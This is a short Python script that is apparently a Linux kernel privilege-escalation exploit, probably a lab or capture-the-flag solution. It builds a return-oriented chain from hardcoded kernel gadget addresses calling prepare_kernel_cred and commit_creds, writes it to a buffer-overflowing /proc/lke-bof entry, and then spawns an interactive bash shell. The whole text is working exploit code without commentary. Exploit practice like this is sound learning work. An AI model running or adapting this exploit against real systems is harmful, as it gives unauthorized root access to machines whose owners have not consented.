from struct import pack
import os

xor_edi = 0xffffffff810a1035
prepare_cred = 0xffffffff81081716
commit_cred = 0xffffffff8108157b
pop_rcx = 0xffffffff81043661
mov_rdi_rax = 0xffffffff8148df59

payload = b''
payload += pack('Q', xor_edi)
payload += pack('Q', prepare_cred)
payload += pack('Q', pop_rcx)
payload += pack('Q', 0)
payload += pack('Q', mov_rdi_rax)
payload += pack('Q', commit_cred)

open('/proc/lke-bof', 'wb').write(payload)
print(os.getuid())
os.execlp("bash", "-i")
